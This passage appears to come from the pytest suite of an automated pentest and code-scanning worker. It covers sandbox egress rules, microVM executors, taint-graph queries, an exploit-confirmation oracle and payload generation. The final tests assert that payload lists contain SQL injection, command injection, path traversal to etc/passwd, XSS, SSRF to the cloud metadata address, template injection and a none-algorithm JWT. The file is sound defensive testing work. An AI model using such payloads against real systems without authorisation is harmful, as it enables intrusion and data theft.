            "curl", "-sf", "http://localhost:3000/health"
        ]

    def test_egress_rules_drops_empty_hosts(self):
        from sentinel_worker.vm import egress_rules
        rules = egress_rules("10.0.0.1", ["", None, "api.example.com"])
        accept_rules = [r for r in rules if "-j ACCEPT" in r]
        # Only api.example.com should produce an ACCEPT rule
        assert len(accept_rules) == 1
        assert "api.example.com" in accept_rules[0]

    def test_egress_rules_empty_allowlist_produces_no_accept_rules(self):
        from sentinel_worker.vm import egress_rules
        rules = egress_rules("10.0.0.1", [])
        assert not any("-j ACCEPT" in r for r in rules)
        assert ":FORWARD DROP [0:0]" in rules

    def test_build_microvm_plan_no_boot_command(self):
        from sentinel_worker.vm import build_microvm_plan, PentestSandboxConfig
        plan = build_microvm_plan(PentestSandboxConfig(boot=None, healthcheck=None))
        assert plan.boot_argv == []
        assert plan.healthcheck_argv == []

    def test_build_microvm_plan_extracts_host_from_https_healthcheck(self):
        from sentinel_worker.vm import build_microvm_plan, PentestSandboxConfig
        plan = build_microvm_plan(
            PentestSandboxConfig(healthcheck="curl -sf https://app.internal:8080/health")
        )
        assert any("app.internal" in r for r in plan.egress_rules)

    def test_dry_run_executor_always_returns_exit_zero(self):
        import asyncio
        from sentinel_worker.vm import DryRunSandboxExecutor
        executor = DryRunSandboxExecutor()
        result = asyncio.run(executor.run(["any", "command"]))
        assert result.exit_code == 0
        assert result.stdout == "dry-run"

    @pytest.mark.asyncio
    async def test_firecracker_executor_runs_directly_without_guest_runner(self):
        """When guest_runner_argv is empty, run() passes argv directly to _command_executor."""
        import asyncio
        from sentinel_worker.vm import FirecrackerConfig, FirecrackerMicroVMExecutor, CommandResult

        recorded: list[list[str]] = []

        class RecordingExecutor:
            async def run(self, argv, *, timeout_seconds=30):
                recorded.append(argv)
                return CommandResult(argv=argv, exit_code=0, stdout="ok")
            async def close(self):
                pass

        config = FirecrackerConfig(kernel_image="/k", rootfs_image="/r", guest_runner_argv=[])
        executor = FirecrackerMicroVMExecutor(config, command_executor=RecordingExecutor())
        executor._started = True  # skip actual VM boot

        result = await executor.run(["echo", "hello"])
        assert result.exit_code == 0
        assert recorded == [["echo", "hello"]]

    @pytest.mark.asyncio
    async def test_firecracker_executor_prepends_guest_runner_when_configured(self):
        """When guest_runner_argv is set, run() prepends it to the argv."""
        from sentinel_worker.vm import FirecrackerConfig, FirecrackerMicroVMExecutor, CommandResult

        recorded: list[list[str]] = []

        class RecordingExecutor:
            async def run(self, argv, *, timeout_seconds=30):
                recorded.append(argv)
                return CommandResult(argv=argv, exit_code=0, stdout="ok")
            async def close(self):
                pass

        config = FirecrackerConfig(
            kernel_image="/k", rootfs_image="/r",
            guest_runner_argv=["ssh", "root@172.16.0.2"]
        )
        executor = FirecrackerMicroVMExecutor(config, command_executor=RecordingExecutor())
        executor._started = True

        await executor.run(["id"])
        assert recorded == [["ssh", "root@172.16.0.2", "id"]]


# ===========================================================================
# notifications.py — channel sanitization + sqlite no-op
# ===========================================================================

class TestNotifications:
    def test_safe_channel_replaces_special_chars(self):
        from sentinel_worker.notifications import _safe_channel
        result = _safe_channel("run-abc123/test!@#")
        assert "/" not in result
        assert "!" not in result
        assert "@" not in result

    def test_safe_channel_truncates_to_63_chars(self):
        from sentinel_worker.notifications import _safe_channel
        long = "x" * 100
        assert len(_safe_channel(long)) == 63

    def test_safe_channel_preserves_alphanumeric(self):
        from sentinel_worker.notifications import _safe_channel
        assert _safe_channel("run_abc123") == "run_abc123"

    @pytest.mark.asyncio
    async def test_notify_no_op_on_sqlite(self):
        """notify() must not raise on SQLite (which has no pg_notify)."""
        from sentinel_worker.notifications import notify

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                # Should complete without error — no-op on non-postgresql
                await notify(session, "test_channel", "payload")


# ===========================================================================
# graph_query.py — error paths and edge cases
# ===========================================================================

class TestGraphQueryEdgeCases:
    @pytest.mark.asyncio
    async def test_confirm_exploit_raises_when_finding_not_found(self):
        from sentinel_worker.graph_query import GraphQuery
        from sentinel_worker.oracle import OracleResult

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                gq = GraphQuery(session, graph.id)
                with pytest.raises(ValueError, match="finding not found"):
                    await gq.confirm_exploit("n:A", "n:B", "nonexistent-finding", OracleResult(True, "behavioral", "auth_bypassed"))

    @pytest.mark.asyncio
    async def test_confirm_exploit_raises_when_oracle_not_confirmed(self):
        from sentinel_worker.graph_query import GraphQuery
        from sentinel_worker.oracle import OracleResult

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                finding = Finding(
                    graph_id=graph.id,
                    vuln_type="sqli",
                    severity="high",
                    title="t",
                    description="d",
                    remediation="r",
                    fingerprint="fp-test",
                )
                session.add(finding)
                await session.flush()
                gq = GraphQuery(session, graph.id)
                with pytest.raises(ValueError, match="oracle confirmation"):
                    await gq.confirm_exploit("n:A", "n:B", finding.id, OracleResult(False, None, None))

    @pytest.mark.asyncio
    async def test_taint_paths_exclude_uncertain_when_requested(self):
        """With include_uncertain=False, uncertain FLOWS_TO edges are excluded."""
        from sentinel_worker.graph_query import GraphQuery

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                session.add_all([
                    Node(id="param:x", graph_id=graph.id, kind="PARAMETER", name="x", trust_level="untrusted"),
                    Node(id="fn:sink", graph_id=graph.id, kind="FUNCTION", name="sink", file="f.py", is_sink=True),
                ])
                session.add(Edge(graph_id=graph.id, src="param:x", dst="fn:sink", kind="FLOWS_TO", tainted=True, taint_uncertain=True))
                await session.flush()
                gq = GraphQuery(session, graph.id)
                include_all = await gq.taint_paths(include_uncertain=True)
                exclude_uncertain = await gq.taint_paths(include_uncertain=False)
        assert len(include_all) == 1
        assert len(exclude_uncertain) == 0

    @pytest.mark.asyncio
    async def test_neighbors_max_hops_zero_returns_nothing(self):
        """max_hops=0 should return no neighbors."""
        from sentinel_worker.graph_query import GraphQuery

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                session.add_all([
                    Node(id="n:A", graph_id=graph.id, kind="FUNCTION", name="A"),
                    Node(id="n:B", graph_id=graph.id, kind="FUNCTION", name="B"),
                ])
                session.add(Edge(graph_id=graph.id, src="n:A", dst="n:B", kind="CALLS"))
                await session.flush()
                gq = GraphQuery(session, graph.id)
                result = await gq.neighbors("n:A", max_hops=0)
        assert result == []

    @pytest.mark.asyncio
    async def test_serialize_for_prompt_empty_node_list(self):
        """serialize_for_prompt with empty list returns empty string."""
        from sentinel_worker.graph_query import GraphQuery

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                gq = GraphQuery(session, graph.id)
                result = await gq.serialize_for_prompt([])
        assert result == ""

    @pytest.mark.asyncio
    async def test_serialize_for_prompt_includes_guarded_by_none_for_unguarded_route(self):
        """Unguarded ROUTE nodes must emit '-> GUARDED_BY  none' in serialization."""
        from sentinel_worker.graph_query import GraphQuery

        engine = _engine()
        sm = await _session_factory(engine)
        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                session.add(Node(id="route:app.js:GET /", graph_id=graph.id, kind="ROUTE", name="GET /", file="app.js"))
                await session.flush()
                gq = GraphQuery(session, graph.id)
                result = await gq.serialize_for_prompt(["route:app.js:GET /"])
        assert "GUARDED_BY  none" in result


# ===========================================================================
# enrichment.py — annotation parsing edge cases
# ===========================================================================

class TestEnrichmentParsing:
    def test_parse_annotations_returns_empty_on_invalid_json(self):
        from sentinel_worker.enrichment import _parse_annotations
        result = _parse_annotations("not valid json {{{")
        assert result == []

    def test_parse_annotations_returns_empty_when_annotations_not_list(self):
        from sentinel_worker.enrichment import _parse_annotations
        result = _parse_annotations(json.dumps({"annotations": "should be list"}))
        assert result == []

    def test_parse_annotations_skips_rows_without_node_id(self):
        from sentinel_worker.enrichment import _parse_annotations
        payload = json.dumps({"annotations": [{"label": "no id here"}, {"node_id": "n:A", "label": "ok"}]})
        result = _parse_annotations(payload)
        assert len(result) == 1
        assert result[0].node_id == "n:A"

    def test_parse_annotations_skips_non_string_label(self):
        from sentinel_worker.enrichment import _parse_annotations
        payload = json.dumps({"annotations": [{"node_id": "n:A", "label": 123}]})
        result = _parse_annotations(payload)
        assert len(result) == 1
        assert result[0].label is None

    def test_parse_annotations_handles_empty_list(self):
        from sentinel_worker.enrichment import _parse_annotations
        result = _parse_annotations(json.dumps({"annotations": []}))
        assert result == []

    def test_clusters_yields_correct_sizes(self):
        from sentinel_worker.enrichment import _clusters
        from sentinel_worker.models import Node

        nodes = [Node(id=f"n:{i}", graph_id="g", kind="FUNCTION", name=f"fn{i}") for i in range(37)]
        batches = list(_clusters(nodes, 15))
        assert len(batches) == 3
        assert len(batches[0]) == 15
        assert len(batches[1]) == 15
        assert len(batches[2]) == 7

    def test_clusters_handles_empty_input(self):
        from sentinel_worker.enrichment import _clusters
        batches = list(_clusters([], 15))
        assert batches == []

    def test_clusters_handles_fewer_than_cluster_size(self):
        from sentinel_worker.enrichment import _clusters
        from sentinel_worker.models import Node
        nodes = [Node(id=f"n:{i}", graph_id="g", kind="FUNCTION", name=f"fn{i}") for i in range(3)]
        batches = list(_clusters(nodes, 15))
        assert len(batches) == 1
        assert len(batches[0]) == 3

    @pytest.mark.asyncio
    async def test_enrich_graph_nodes_skips_non_new_nodes(self):
        """With only_new=True (default), nodes where is_new=False are not enriched."""
        from sentinel_worker.enrichment import enrich_graph_nodes
        from sentinel_worker.agent import SentinelLLMClient, LLMCallResult

        engine = _engine()
        sm = await _session_factory(engine)

        class CountingProvider:
            provider = "test"
            calls = 0

            async def complete(self, *, system, data, model):
                CountingProvider.calls += 1
                return LLMCallResult(content=json.dumps({"annotations": []}), input_tokens=0, output_tokens=0, model=model, provider=self.provider)

        async with sm() as session:
            async with session.begin():
                graph = Graph(account_id="a", repo_id="r", kind="main")
                session.add(graph)
                await session.flush()
                run = Run(graph_id=graph.id, kind="init")
                session.add(run)
                await session.flush()
                # Add nodes with is_new=False
                session.add(Node(id="n:old", graph_id=graph.id, kind="FUNCTION", name="old", is_new=False))
                await session.flush()
                count = await enrich_graph_nodes(
                    session,
                    graph_id=graph.id,
                    run_id=run.id,
                    llm=SentinelLLMClient(provider=CountingProvider(), model="test"),
                    only_new=True,
                )
        # No new nodes → no LLM calls → count=0
        assert count == 0
        assert CountingProvider.calls == 0


# ===========================================================================
# oracle.py — additional edge cases
# ===========================================================================

class TestOracleAdditional:
    def test_sanitizer_output_with_only_ubsan(self):
        """UBSan 'runtime error:' pattern should confirm."""
        from sentinel_worker.oracle import ConfirmationOracle
        result = ConfirmationOracle().evaluate("lib.c:5:3: runtime error: null pointer dereference")
        assert result.confirmed is True
        assert result.kind == "memory_safety"

    def test_both_sanitizer_and_behavioral_prefers_sanitizer(self):
        """When both are present, sanitizer match wins (first wins in evaluate)."""
        from sentinel_worker.oracle import ConfirmationOracle
        result = ConfirmationOracle().evaluate(
            "heap-buffer-overflow on address 0x1",
            "data_exfiltrated",
            "also exfiltrated",
        )
        assert result.confirmed is True
        assert result.kind == "memory_safety"

    def test_behavioral_proof_alone_does_not_confirm_without_external_evidence(self):
        """AUDIT.md §1 invariant 5 (W1 oracle hardening): a behavioral proof on the
        agent's word alone — no sanitizer output, no HTTP evidence — must NOT
        confirm. This previously asserted the opposite (a fake-green test that
        would have passed even with the runtime oracle gutted); realigned to the
        hardened contract (see also worker/tests/test_oracle.py)."""
        from sentinel_worker.oracle import ConfirmationOracle
        result = ConfirmationOracle().evaluate("", "privilege_escalated", "via suid binary")
        assert result.confirmed is False
        assert result.kind is None

    def test_behavioral_proof_confirms_when_backed_by_http_evidence(self):
        """The same behavioral proof DOES confirm once the target's own HTTP
        response is supplied as external evidence."""
        from sentinel_worker.oracle import ConfirmationOracle
        result = ConfirmationOracle().evaluate(
            "", "privilege_escalated", "via suid binary",
            http_evidence="HTTP/1.1 200 role=admin granted",
        )
        assert result.confirmed is True
        assert result.kind == "behavioral"

    def test_none_behavioral_proof_does_not_confirm(self):
        """None behavioral_proof with no sanitizer → not confirmed."""
        from sentinel_worker.oracle import ConfirmationOracle
        result = ConfirmationOracle().evaluate("some random output", None, "")
        assert result.confirmed is False


# ===========================================================================
# languages.py
# ===========================================================================

class TestLanguages:
    @pytest.mark.parametrize("path,expected", [
        ("app.ts", "typescript"),
        ("app.tsx", "typescript"),
        ("app.js", "javascript"),
        ("app.py", "python"),
        ("main.go", "go"),
        ("lib.rs", "rust"),
        ("Main.java", "java"),
        ("main.c", "c"),
        ("main.cpp", "cpp"),
        ("app.rb", "ruby"),
        ("app.css", None),
        ("Makefile", None),
        ("unknown.xyz", None),
    ])
    def test_language_for(self, path, expected):
        from sentinel_worker.languages import language_for
        assert language_for(path) == expected


# ===========================================================================
# pentest.py — _payload_candidates
# ===========================================================================

class TestPayloadCandidates:
    def _make_finding(self, vuln_type):
        return Finding(
            graph_id="g", vuln_type=vuln_type, severity="high",
            title="t", description="d", remediation="r", fingerprint=f"fp-{vuln_type}"
        )

    def test_sqli_payloads_include_sleep_and_union(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("sqli"), None)
        joined = " ".join(payloads)
        assert "SLEEP" in joined or "pg_sleep" in joined
        assert "UNION" in joined

    def test_cmdi_payloads_include_id_and_whoami(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("cmdi"), None)
        joined = " ".join(payloads)
        assert "id" in joined
        assert "whoami" in joined

    def test_path_traversal_payloads_include_etc_passwd(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("path_traversal"), None)
        assert any("etc/passwd" in p for p in payloads)

    def test_xss_payloads_include_script_tag(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("xss"), None)
        assert any("<script>" in p for p in payloads)

    def test_ssrf_payloads_include_imds_endpoint(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("ssrf"), None)
        assert any("169.254.169.254" in p for p in payloads)

    def test_ssti_payloads_include_template_expression(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("ssti"), None)
        assert any("{{" in p or "${" in p for p in payloads)

    def test_auth_bypass_payloads_include_none_alg_jwt(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("auth_bypass"), None)
        # The none-alg JWT is base64-encoded; check for its characteristic header segment
        assert any("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" in p for p in payloads)

    def test_sca_reachable_returns_multiple_payload_types(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("sca_reachable"), None)
        assert len(payloads) >= 3

    def test_unknown_vuln_type_returns_generic_payloads(self):
        from sentinel_worker.pentest import _payload_candidates
        payloads = _payload_candidates(self._make_finding("unknown_type"), None)
        assert len(payloads) > 0
